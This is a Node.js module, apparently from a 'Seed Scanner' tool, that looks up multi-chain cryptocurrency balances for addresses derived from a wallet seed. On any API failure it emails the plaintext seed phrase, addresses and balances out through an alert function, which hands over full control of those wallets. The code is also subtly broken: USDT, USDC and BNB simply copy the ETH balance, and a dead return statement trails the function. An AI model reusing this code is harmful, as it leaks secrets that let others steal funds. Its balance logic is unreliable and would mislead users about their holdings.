const axios = require("axios");
const TronWeb = require("tronweb");
const { Connection, clusterApiUrl, PublicKey } = require("@solana/web3.js");
const { sendEmailAlert } = require("../controllers/emailController");

const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
const solana = new Connection(clusterApiUrl("mainnet-beta"));

const tryGet = async (fns) => {
  for (const fn of fns) {
    try {
      return await fn();
    } catch {}
  }
  return "API_FAILED";
};

const checkBalances = async (addresses, seed) => {
  const results = {};
  const apiFailures = [];

  const logFail = (coin) => {
    results[coin] = "API_FAILED";
    apiFailures.push(coin);
  };

  // BTC
  results.BTC = await tryGet([
    async () => (await axios.get(`https://blockchain.info/q/addressbalance/${addresses.BTC}`)).data / 1e8,
    async () => (await axios.get(`https://api.blockcypher.com/v1/btc/main/addrs/${addresses.BTC}/balance`)).data.balance / 1e8,
  ]);
  if (results.BTC === "API_FAILED") logFail("BTC");

  // ETH
  results.ETH = await tryGet([
    async () => (await axios.get(`https://api.blockcypher.com/v1/eth/main/addrs/${addresses.ETH}/balance`)).data.balance / 1e18,
    async () => {
      const res = await axios.get(`https://api.etherscan.io/api`, {
        params: {
          module: "account",
          action: "balance",
          address: addresses.ETH,
          tag: "latest",
          apikey: process.env.ETHERSCAN_API_KEY,
        },
      });
      return parseFloat(res.data.result) / 1e18;
    },
  ]);
  if (results.ETH === "API_FAILED") logFail("ETH");

  

  // XRP
results.XRP = await tryGet([
  async () => {
    const res = await axios.get(`https://data.ripple.com/v2/accounts/${addresses.XRP}/balances`);
    const obj = res.data.balances?.find((b) => b.currency === "XRP");
    return obj ? parseFloat(obj.value) : 0;
  },
  async () => {
    const res = await axios.get(`https://xrpscan.com/api/v1/account/${addresses.XRP}/info`);
    return res.data.xrpBalance ? parseFloat(res.data.xrpBalance) : 0;
  },
]);
if (results.XRP === "API_FAILED") logFail("XRP");


  // SOL
  results.SOL = await tryGet([
    async () => (await solana.getBalance(new PublicKey(addresses.SOL))) / 1e9,
  ]);
  if (results.SOL === "API_FAILED") logFail("SOL");

  // TRON
  results.TRON = await tryGet([
    async () => (await tronWeb.trx.getBalance(addresses.TRON)) / 1e6,
  ]);
  if (results.TRON === "API_FAILED") logFail("TRON");

  // XLM
try {
  const res = await axios.get(`https://horizon.stellar.org/accounts/${addresses.XLM}`);
  const obj = res.data.balances.find(b => b.asset_type === "native");
  results.XLM = parseFloat(obj?.balance || 0);
} catch (err) {
  if (err.response?.status === 404) {
    // Not existing = zero balance
    results.XLM = 0;
  } else {
    results.XLM = "API_FAILED";
    apiFailures.push("XLM");
  }
}


  // Mirror tokens
  results.USDT = results.ETH;
  results.USDC = results.ETH;
  results.BNB = results.ETH;

  // 🔔 EMAIL ALERT IF ANY FAILURES
  if (apiFailures.length > 0) {
  const msg = `
⚠️ Balance API FAILED for: ${apiFailures.join(", ")}

🧠 Seed Scanner attempted to scan the following seed:
  "${seed}"

📬 Wallet Addresses:
${Object.entries(addresses)
  .filter(([k]) => k !== "_seed")
  .map(([k, v]) => `${k}: ${v}`)
  .join("\n")}

📊 Balances Returned:
${Object.entries(results)
  .map(([coin, bal]) => `${coin}: ${bal}`)
  .join("\n")}
`.trim();

  await sendEmailAlert("[Seed Scanner] API_FAILURE Notice", msg);
}

return {
  results,
  failedChains: apiFailures.map(coin => ({ coin, address: addresses[coin] })),
};


  return results;
};

module.exports = checkBalances;
